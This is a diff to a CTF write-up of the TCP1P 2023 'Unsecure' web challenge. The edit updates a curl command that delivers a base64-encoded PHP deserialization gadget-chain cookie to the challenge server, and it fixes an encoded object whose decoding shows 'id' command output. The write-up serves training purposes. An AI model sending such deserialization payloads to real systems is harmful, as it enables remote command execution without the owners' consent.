@@ -237,7 +237,7 @@ echo(base64_encode($serializedGadgetTwo));
 When we run the payload above, we will see that somehow the command executed.
 
 ```bash
-curl "http://ctf.tcp1p.com:45678/" -b "cookie=TzoxNzoiR2FkZ2V0VHdvXEVjaG9lcnMiOjE6e3M6ODoiACoAa2xhc3MiO086MTY6IkdhZGdldE9uZVxBZGRlcnMiOjE6e3M6MTk6IgBHYWRnZXRPbmVcQWRkZXJzAHgiO3M6NDM6IlRDUDFQe3Vuc2VyaWFsaXplIGluIHBocCBnbyBicnJycnJycnIgb3VjaH0iO319"
+curl "http://ctf.tcp1p.com:45678/" -b "cookie=TzoxNzoiR2FkZ2V0VHdvXEVjaG9lcnMiOjE6e3M6ODoiACoAa2xhc3MiO086MTY6IkdhZGdldE9uZVxBZGRlcnMiOjE6e3M6MTk6IgBHYWRnZXRPbmVcQWRkZXJzAHgiO3M6MjE1OiJ1aWQ9MTAwMChrYWxpKSBnaWQ9MTAwMChrYWxpKSBncm91cHM9MTAwMChrYWxpKSw0KGFkbSksMjAoZGlhbG91dCksMjQoY2Ryb20pLDI1KGZsb3BweSksMjcoc3VkbyksMjkoYXVkaW8pLDMwKGRpcCksNDQodmlkZW8pLDQ2KHBsdWdkZXYpLDEwMCh1c2VycyksMTA2KG5ldGRldiksMTExKGJsdWV0b290aCksMTE3KHNjYW5uZXIpLDE0MCh3aXJlc2hhcmspLDE0MihrYWJveGVyKSI7fX0="
 ```
 
 ![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/12_tcp1pctf2023_web_unsecure/TCP1PCTF_Unsecure_8.png)
@@ -246,7 +246,7 @@ Im not an expert with **Deserialization**, but let us do some checking with the 
 
 ```bash
 # Base64 Encoded Bbject
-TzoxNzoiR2FkZ2V0VHdvXEVjaG9lcnMiOjE6e3M6ODoiACoAa2xhc3MiO086MTY6IkdhZGdldE9uZVxBZGRlcnMiOjE6e3M6MTk6IgBHYWRnZXRPbmVcQWRkZXJzAHgiO3M6MjE1OiJ1aWQ9MTAwMChrYWxpKSBnaWQ9MTAwMChrYWxpKSBncm91cHM9MTAwMChrYWxpKSw0KGFkbSksMjAoZGlhbG91dCksMjQoY2Ryb20pLDI1KGZsb3BweSksMjcoc3VkbyksMjkoYXVkaW8pLDMwKGRpcCksNDQodmlkZW8pLDQ2KHBsdWdkZXYpLDEwMCh1c2VycyksMTA2KG5ldGRldiksMTExKGJsdWV0b290aCksMTE3KHNjYW5uZXIpLDE0MCh3aXJlc2hhcmspLDE0MihrYWJveGVyKSI7fX
+TzoxNzoiR2FkZ2V0VHdvXEVjaG9lcnMiOjE6e3M6ODoiACoAa2xhc3MiO086MTY6IkdhZGdldE9uZVxBZGRlcnMiOjE6e3M6MTk6IgBHYWRnZXRPbmVcQWRkZXJzAHgiO3M6MjE1OiJ1aWQ9MTAwMChrYWxpKSBnaWQ9MTAwMChrYWxpKSBncm91cHM9MTAwMChrYWxpKSw0KGFkbSksMjAoZGlhbG91dCksMjQoY2Ryb20pLDI1KGZsb3BweSksMjcoc3VkbyksMjkoYXVkaW8pLDMwKGRpcCksNDQodmlkZW8pLDQ2KHBsdWdkZXYpLDEwMCh1c2VycyksMTA2KG5ldGRldiksMTExKGJsdWV0b290aCksMTE3KHNjYW5uZXIpLDE0MCh3aXJlc2hhcmspLDE0MihrYWJveGVyKSI7fX0=
 
 # Base64 Decoded Object
 O:17:"GadgetTwo\Echoers":1:{s:8:"*klass";O:16:"GadgetOne\Adders":1:{s:19:"GadgetOne\Addersx";s:215:"uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev),111(bluetooth),117(scanner),140(wireshark),142(kaboxer)";}
